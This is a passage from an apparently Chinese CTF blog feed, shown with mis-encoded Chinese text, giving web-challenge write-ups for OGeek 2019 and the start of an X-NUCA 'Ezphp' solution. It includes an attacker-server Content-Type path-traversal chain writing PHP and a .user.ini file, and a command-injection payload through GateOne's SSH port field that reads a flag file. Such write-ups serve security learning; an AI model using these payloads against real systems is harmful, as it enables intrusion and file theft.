class="string">"backup/&#123;$filename&#125;.txt"</span>);</span></span><br><span class="line"><span class="php">    unlink(glob(<span class="string">"backup/*"</span>)[<span class="number">0</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">"/^\w&#123;8&#125;$/"</span>, $_REQUEST[<span class="string">'filename'</span>])</span></span></span><br></pre></td></tr></table></figure>
<p>æ­£åˆ™åŒ¹é…çš„æ˜¯å­—æ¯æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œå›ºå®šé•¿åº¦ä¸º8ï¼Œæ’åºåä¼šåˆ é™¤ç¬¬ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™å…¥çš„æ–‡ä»¶æ’åºåœ¨åé¢çš„è¯æ˜¯ä¸ä¼šè¢«åˆ é™¤çš„ï¼Œæ‰€ä»¥çŒœæµ‹ï¼Œåˆ—è¡¨ä¸­å­˜åœ¨å­˜åœ¨æŸä¸ªä¸ä¼šè¢«åˆ é™¤çš„æ–‡ä»¶ï¼Œè€Œè¿™ä¸ªç›®å½•åˆå«backupï¼Œæ‰€ä»¥çŒœæµ‹ï¼Œå¯èƒ½ä¼šæœ‰éšè—çš„æºç å¤‡ä»½æ–‡ä»¶ï¼Œè€Œå¦‚æœæˆ‘ä»¬å†™å…¥çš„æ–‡ä»¶æ’åœ¨å›ºå®šæ–‡ä»¶ä¹‹å‰ï¼Œæˆ‘ä»¬çš„æ–‡ä»¶ä¼šè¢«åˆ é™¤ã€‚æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥fuzzå›ºå®šæ–‡ä»¶çš„æ–‡ä»¶åï¼Œæœ€åå¾—åˆ°æ–‡ä»¶åä¸º aefebab8.txtï¼Œå…¶ä¸­å†…å®¹ä¸º</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- src/8a66c58a168c9dc0fb622365cbe340fc.php --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"../utils/utils.php"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$sandbox = Get_Sandbox();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'method'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $method = $_REQUEST[<span class="string">'method'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($method == <span class="string">'info'</span>)&#123;</span></span><br><span class="line"><span class="php">        phpinfo();</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">elseif</span>($method == <span class="string">'download'</span> <span class="keyword">and</span> <span class="keyword">isset</span>($_REQUEST[<span class="string">'url'</span>]))&#123;</span></span><br><span class="line"><span class="php">        $url = $_REQUEST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">        $url_parse = parse_url($url);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($url_parse[<span class="string">'scheme'</span>]) <span class="keyword">or</span> $url_parse[<span class="string">'scheme'</span>] != <span class="string">'http'</span> <span class="keyword">or</span> !<span class="keyword">isset</span>($url_parse[<span class="string">'host'</span>]) <span class="keyword">or</span> $url_parse[<span class="string">'host'</span>] == <span class="string">""</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"something wrong"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $path_info = pathinfo($url);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(strpos($path_info[<span class="string">'filename'</span>], <span class="string">"."</span>) !== <span class="keyword">false</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"something wrong"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!Check_Ext($path_info[<span class="string">'extension'</span>]))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"something wrong"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $response = GetFileInfoFromHeader($url);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $save_dir = <span class="string">"../users/$&#123;sandbox&#125;/uploads/&#123;$response['type']&#125;/"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(is_dir(dirname($save_dir)) <span class="keyword">and</span> !is_dir($save_dir))&#123;</span></span><br><span class="line"><span class="php">            mkdir($save_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $save_path = <span class="string">"&#123;$save_dir&#125;&#123;$path_info['filename']&#125;.&#123;$response['ext']&#125;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"/uploads/&#123;$response['type']&#125;/&#123;$path_info['filename']&#125;.&#123;$response['ext']&#125;"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!is_dir($save_path))&#123;</span></span><br><span class="line"><span class="php">            file_put_contents($save_path, $response[<span class="string">'content'</span>]);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç»™äº†æºæ–‡ä»¶åœ°å€å’Œæºç ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä»£ç å®¡è®¡çš„äº‹ï¼Œé€šè¿‡æºæ–‡ä»¶æŸ¥çœ‹phpinfoï¼Œå¯ä»¥å¾—åˆ°ç½‘ç«™æ ¹è·¯å¾„ï¼Œä»¥åŠçŸ¥é“æœ‰disable_functionæˆ‘å°±ä¸å¤šè¯´äº†ï¼Œä»£ç æä¾›ä¸€ä¸ªè¿œç¨‹æ–‡ä»¶ä¸‹è½½åŠŸèƒ½ï¼Œä¸è¿‡ç”±äºCheck_Ext å‡½æ•°é™åˆ¶äº†å¯ä¸‹è½½çš„æ–‡ä»¶ç±»å‹ï¼Œåªå¯ä»¥ä»»æ„ä¸‹è½½å…¶ä»–ç½‘ç«™ä¸Šçš„jpgã€png ç­‰å›¾ç‰‡æ ¼å¼çš„æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œå¹¶ä»¥{$response[â€˜typeâ€™]}ä¸ºç›®å½•å{$path_info[â€˜filenameâ€™]}.{$response[â€˜extâ€™]}ä¸ºæ–‡ä»¶åï¼Œæµ‹è¯•å‘ç°$responseçš„å€¼æ˜¯ä»è¿œç¨‹æœåŠ¡å™¨response headerä¸­çš„Content-Type è·å–ï¼Œæ‰€ä»¥æ§åˆ¶äº†ä¸ªäººæœåŠ¡å™¨æŸä¸ªæ–‡ä»¶çš„Content-Typeï¼Œæ„é€ </p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">method</span>=<span class="title">download</span>&amp;<span class="title">url</span>=<span class="title">http</span>:</span><span class="comment">//x.x.x.x/.jpg</span></span><br></pre></td></tr></table></figure>
<p>å»è®¿é—®ä¸ªäººæœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶å°±å¯ä»¥æ§åˆ¶ä¸‹è½½çš„å†…å®¹ï¼Œä½†æ˜¯åªä¸‹è½½å›¾ç‰‡è‚¯å®šæ˜¯è§£ä¸äº†é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨vpsä¸Šå»ºä¸€ä¸ª.htaccess,è®¾ç½®404è·³è½¬</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ErrorDocument <span class="number">404</span> /cccc.php    #è®¾ç½®<span class="number">404</span> è·³è½¬åˆ°åˆ°cccc.php é¡µé¢</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥ä½†è®¿é—®æŸä¸ªä¸å­˜åœ¨çš„jpgæ–‡ä»¶æ—¶å°±ä¼šè·³è½¬åˆ°cccc.phpä¸Šï¼Œè¿™æ ·å¯ä»¥è¿‡æ‰Check_Extçš„åç¼€æ£€æµ‹ã€‚æ‰€ä»¥å°±æ˜¯å¦‚ä½•æ„é€ cccc.phpçš„äº‹äº†ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cccc.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: aaa/./1.jpg'</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;?php file_get_contents('/flag');?&gt;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#æˆ‘å·²ç»çŸ¥é“flagåœ¨è¿™äº†å°±ä¸å¤šå†™scandir('/');è¿™ä¸€æ­¥äº†</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-4cc317440cd80495.png" alt></p>
<p>è¿™æ ·ä¼šè·¨ç›®å½•åœ¨uploadsç›®å½•ä¸Šåˆ›å»º1.jpg,æ–‡ä»¶çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬å†™å…¥çš„ä»£ç </p>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-a3beece842f0d789.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>å†™å…¥jpgæ–‡ä»¶æ ¼å¼çš„ä»£ç åï¼Œä¹Ÿå°±éœ€è¦phpæ–‡ä»¶åŒ…æ¶µæ‰§è¡Œï¼Œé¢˜ç›®é™åˆ¶æ­»äº†ï¼Œåæ­£æˆ‘æ˜¯æ²¡å†™phpæ–‡ä»¶æˆåŠŸè¿‡ï¼ˆå¬å¸ˆå‚…ä»¬è¯´å‰ä¸€æ™šæ”¾é¢˜æ—¶æ˜¯å¯ä»¥çš„ï¼Œæˆ‘è¯•è¿‡ /aaa/php/.æ²¡å†™æˆåŠŸå°±æ”¾å¼ƒäº†ï¼‰ï¼Œ.htaccessæ–‡ä»¶ä¹Ÿå†™ä¸äº†ï¼Œä¸è¿‡è¿˜é˜”ä»¥å†™.user.iniæ–‡ä»¶ï¼Œä¸è¿‡.user.iniæ–‡ä»¶åªå¯¹å½“å‰ç›®å½•å’Œå­ç›®å½•ä¸­çš„phpæ–‡ä»¶ç”Ÿæ•ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å†™çš„æ—¶å€™è¿˜å¾—è·¨åˆ°usersç›®å½•å»ï¼ˆsandboxå¯ä»¥è¯•è¯•ï¼Œæˆ‘æ˜¯æ²¡å†™è¿›å»ï¼‰ï¼Œè¿™ä¸ªåœ°æ–¹æœ‰ä¸ªå‘ï¼Œé¢˜ç›®è®¾ç½®äº†å®šæ—¶æ¸…ï¼Œè¿˜æ¸…å¾—æŒºå¿«çš„ï¼Œåˆšå¼€å§‹ä¸€ç›´ä»¥ä¸ºä¸å¯å†™ï¼Œåæ¥çªç„¶å‘ç°æœ‰ä¸€æ¬¡å†™è¿›å»äº†ç„¶åæ²¡äº†ï¼Œæ‰å‘ç°åŸæ¥æœ‰å®šæ—¶æ¸…ï¼Œæ‰€ä»¥åˆ©ç”¨bp å¾ªç¯å†™ä¸‹å°±å¥½ï¼Œæ¬¡æ•°ä¸è¦å¤ªå¤§ï¼Œä¼šè¢«banã€‚<br>æ„é€ cccc.php</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">'Content-Type: .././.user.ini'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>(<span class="string">"auto_prepend_file = /var/www/html/users/[sandbox]/uploads/1.jpg"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-8aa95fcc12ef8f4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h3 id="0x04-Easy-Realworld-Challenge-2"><a href="#0x04-Easy-Realworld-Challenge-2" class="headerlink" title="0x04 Easy Realworld Challenge 2"></a>0x04 Easy Realworld Challenge 2</h3><p>æ¯”èµ›æœŸé—´æ²¡çœ‹è¿™é¢˜ï¼ˆè‡ªæˆ‘è®¤è¯†æ˜ç¡®ï¼‰æŒ‰ç€glzjinå¸ˆå‚…ï¼ˆ<a href="https://www.zhaoj.in/ï¼‰çš„æ€è·¯è¿›è¡Œçš„èµ›åå¤ç°ï¼Œé¢˜ç›®æ˜¯ä¸€ä¸ªå¼€æºçš„ä¸€ä¸ªHTML5" target="_blank" rel="noopener">https://www.zhaoj.in/ï¼‰çš„æ€è·¯è¿›è¡Œçš„èµ›åå¤ç°ï¼Œé¢˜ç›®æ˜¯ä¸€ä¸ªå¼€æºçš„ä¸€ä¸ªHTML5</a> web-based terminal emulator and SSH clientï¼Œåœ°å€ï¼š<a href="https://github.com/liftoff/GateOneï¼Œé¢˜ç›®æç¤ºäº†flag" target="_blank" rel="noopener">https://github.com/liftoff/GateOneï¼Œé¢˜ç›®æç¤ºäº†flag</a> is in localhost, show me your shell! ï¼Œä¹Ÿå°±æ˜¯éœ€è¦getshelläº†ã€‚è§£æ³•ä¸å”¯ä¸€ï¼Œæœ‰å¥½å‡ ä¸ªRCEç‚¹ã€‚æ¼æ´ä»£ç è·¯å¾„ï¼š/gateone/applications/terminalplugins/ssh/ssh.py</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ssh.py</span></span><br><span class="line">def get_host_fingerprint(self, settings):</span><br><span class="line">    <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">    Returns a the hash of the given host's public key by making a remote</span></span><br><span class="line"><span class="string">    connection to the server (not just by looking at known_hosts).</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    out_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'port'</span> <span class="keyword">not</span> <span class="keyword">in</span> settings:</span><br><span class="line">       <span class="built_in"> port </span>= 22</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in"> port </span>= settings[<span class="string">'port'</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'host'</span> <span class="keyword">not</span> <span class="keyword">in</span> settings:</span><br><span class="line">        out_dict[<span class="string">'result'</span>] = _(<span class="string">"Error:  You must supply a 'host'."</span>)</span><br><span class="line">        message = &#123;<span class="string">'terminal:sshjs_display_fingerprint'</span>: out_dict&#125;</span><br><span class="line">        self.write_message(message)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host = settings[<span class="string">'host'</span>]</span><br><span class="line">    self.ssh_log.<span class="builtin-name">debug</span>(</span><br><span class="line">        <span class="string">"get_host_fingerprint(%s:%s)"</span> % (host, port),</span><br><span class="line">        metadata=&#123;<span class="string">'host'</span>: host, <span class="string">'port'</span>: port&#125;)</span><br><span class="line">    out_dict.update(&#123;</span><br><span class="line">        <span class="string">'result'</span>: <span class="string">'Success'</span>,</span><br><span class="line">        <span class="string">'host'</span>: host,</span><br><span class="line">        <span class="string">'fingerprint'</span>: None</span><br><span class="line">    &#125;)</span><br><span class="line">    ssh = which(<span class="string">'ssh'</span>)</span><br><span class="line">    command = <span class="string">"%s -p %s -oUserKnownHostsFile=none -F. %s"</span> % (ssh, port, host)</span><br><span class="line">    m = self.new_multiplex(</span><br><span class="line">        command,</span><br><span class="line">        <span class="string">'get_host_key'</span>,</span><br><span class="line">        <span class="attribute">logging</span>=<span class="literal">False</span>) #<span class="built_in"> Logging </span>is <span class="literal">false</span> so we don<span class="string">'t make tons of silly logs</span></span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­portæ²¡æœ‰ç»è¿‡ä»»ä½•å®‰å…¨æ£€æµ‹æˆ–è¿‡æ»¤å°±ç›´æ¥æ‹¼æ¥åˆ°äº†commandä¸Šï¼Œç”¨äºç»ˆç«¯æ‰§è¡Œsshè¿æ¥å‘½ä»¤ï¼Œè€Œget_host_fingerprintå‡½æ•°æ˜¯åœ¨WebSocketä¸­è§¦å‘æ‰§è¡Œ</p>
<figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">#ssh.py</span><br><span class="line">hooks = &#123;</span><br><span class="line">    #<span class="symbol">'Web'</span>: [(r<span class="string">"/ssh"</span>, <span class="type">KnownHostsHandler</span>)],</span><br><span class="line">    <span class="symbol">'WebSocket'</span>: &#123;</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_known_hosts': get_known_hosts,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_save_known_hosts': save_known_hosts,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_connect_string': get_connect_string,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_execute_command': ws_exec_command,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_identities': get_identities,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_public_key': get_public_key,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_private_key': get_private_key,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_host_fingerprint': get_host_fingerprint,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_gen_new_keypair': generate_new_keypair,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_store_id_file': store_id_file,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_delete_identity': delete_identity,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_set_default_identities': set_default_identities,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="symbol">'Escape'</span>: opt_esc_handler,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">#ssh.js</span><br><span class="line">.....</span><br><span class="line">var document = window.document, <span class="comment">// Have to do this because we're sandboxed</span></span><br><span class="line">    go = GateOne,</span><br><span class="line">    prefix = go.prefs.prefix,</span><br><span class="line">    u = go.Utils,</span><br><span class="line">    v = go.Visual,</span><br><span class="line">    E = go.Events,</span><br><span class="line">    t = go.Terminal,</span><br><span class="line">    gettext = go.i18n.gettext,</span><br><span class="line">    urlObj = (window.URL<span class="operator"> || </span>window.webkitURL),</span><br><span class="line">    logFatal = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logFatal,</span><br><span class="line">    logError = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logError,</span><br><span class="line">    logWarning = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logWarning,</span><br><span class="line">    logInfo = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logInfo,</span><br><span class="line">    logDebug = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logDebug;</span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line">    handleConnect: <span class="keyword">function</span>(connectString) &#123;</span><br><span class="line">        <span class="comment">/**:GateOne.SSH.handleConnect(connectString)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Handles the `terminal:sshjs_connect` WebSocket action which should provide an SSH *connectString* in the form of 'user@host:port'.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        The *connectString* will be stored in `GateOne.Terminal.terminals[term]['sshConnectString']` which is meant to be used in duplicating terminals (because you can't rely on the title).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Also requests the host's public SSH key so it can be displayed to the user.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        log<span class="constructor">Debug('<span class="params">sshjs_connect</span>: ' + <span class="params">connectString</span>)</span>;</span><br><span class="line">        var host = connectString.split(<span class="character">'@'</span>)<span class="literal">[<span class="number">1</span>]</span>.split(<span class="character">':'</span>)<span class="literal">[<span class="number">0</span>]</span>,</span><br><span class="line">            port = connectString.split(<span class="character">'@'</span>)<span class="literal">[<span class="number">1</span>]</span>.split(<span class="character">':'</span>)<span class="literal">[<span class="number">1</span>]</span>,</span><br><span class="line">            message = &#123;'host': host, 'port': port&#125;,</span><br><span class="line">            term = localStorage<span class="literal">[<span class="identifier">prefix</span>+'<span class="identifier">selectedTerminal</span>']</span>;</span><br><span class="line">        t.terminals<span class="literal">[<span class="identifier">term</span>]</span><span class="literal">['<span class="identifier">sshConnectString</span>']</span> = connectString;</span><br><span class="line">        go.ws.send(<span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>stringify(&#123;'terminal:ssh_get_host_fingerprint': message&#125;));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥å¯ä»¥çŸ¥é“æ˜¯é€šè¿‡GateOneæ¥å‘é€WebSocketï¼Œä»è€Œè§¦å‘æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€  go.ws.send(JSON.stringify({â€˜terminal:ssh_get_host_fingerprintâ€™: message}));è¯­å¥ï¼Œé€šè¿‡portæ¥è¿›è¡Œå‘½ä»¤æ‹¼æ¥ï¼Œä»è€Œå®ç°åœ¨ç»ˆç«¯ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span></span>ws.send('&#123;<span class="string">"terminal:ssh_get_host_fingerprint"</span>:&#123;<span class="string">"host"</span>:<span class="string">"[ip]"</span>,<span class="string">"port"</span>:<span class="string">"22;ls;"</span>&#125;&#125;')</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-6876a862944ce0a9.png" alt></p>
<p>åˆ—å‡ºäº†ç½‘ç«™çš„æ ¹ç›®å½•</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">bin   dev  gateone  lib    media  opt                <span class="keyword">proc</span><span class="title">  run</span> <span class="title">  srv</span> <span class="title"> tmp</span> <span class="title"> var</span></span><br><span class="line"><span class="title">boot</span> <span class="title"> etc</span> <span class="title"> home</span> <span class="title">    lib64</span> <span class="title"> mnt</span> <span class="title">   ppppp_f_l_4_g_mmm</span> <span class="title"> root</span> <span class="title"> sbin</span> <span class="title"> sys</span> <span class="title"> usr</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æ‹¼æ¥ä¸€ä¸‹cat /ppppp_f_l_4_g_mmmæ–‡ä»¶çš„å‘½ä»¤å°±å¯ä»¥æ‹¿åˆ°flagäº†</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span></span>ws.send('&#123;<span class="string">"terminal:ssh_get_host_fingerprint"</span>:&#123;<span class="string">"host"</span>:<span class="string">"[ip]"</span>,<span class="string">"port"</span>:<span class="string">"22;cat /ppppp_f_l_4_g_mmm;"</span>&#125;&#125;')</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-83b114f6f3a64a5d.png" alt></p>
<h3 id="0x05-render"><a href="#0x05-render" class="headerlink" title="0x05 render"></a>0x05 render</h3><p>Thymeleaf Spring EL SSTI  åé¢è¡¥ä¸Š</p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>XXE</tag>
        <tag>RCE</tag>
        <tag>telnet</tag>
        <tag>.user.ini</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 Xnuca_Ezphp WP</title>
    <url>/2019/08/25/2019-Xnuca-Ezphp-WP/</url>
    <content><![CDATA[<p><strong>è¿™æ¬¡ä¸æ˜¯æ»‘æ°´ï¼Œæ˜¯è¢«éš¾ä½äº†ï¼Œæ—¶é—´éƒ½èŠ±åœ¨äº†Ezphpä¸Šï¼Œç®€å•çºªå½•ä¸€ä¸‹</strong></p>
<p>é¦–å…ˆè´´ä¸€ä¸‹é¢˜ç›®æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®çš„é€»è¾‘å¾ˆç®€å•ï¼Œè®¿é—®çš„æ—¶å€™æ¸…é™¤è¯¥ç›®å½•ä¸‹é™¤äº†index.phpæ–‡ä»¶ä»¥å¤–çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä¸»è¦å°±æ˜¯ä¸¤ä¸ªæ­£åˆ™ï¼Œè€Œä¸”åªæœ‰ä¸€æ¬¡å†™çš„æœºä¼šï¼Œå› ä¸ºæƒ³è¦ç¬¬äºŒæ¬¡å†™çš„è¯ï¼Œå°±ä¼šæŠŠç¬¬ä¸€æ¬¡å†™çš„ä¸œè¥¿ç»™æ¸…äº†</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">$content = $_GET[<span class="string">'content'</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) <span class="params">||</span> stristr($content,<span class="string">'html'</span>) <span class="params">||</span> stristr($content,<span class="string">'type'</span>) <span class="params">||</span> stristr($content,<span class="string">'flag'</span>) <span class="params">||</span> stristr($content,<span class="string">'upload'</span>) <span class="params">||</span> stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">    echo <span class="string">"Hacker"</span>;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">    echo <span class="string">"Hacker"</span>;</span><br><span class="line">    die();</span><br></pre></td></tr></table></figure>

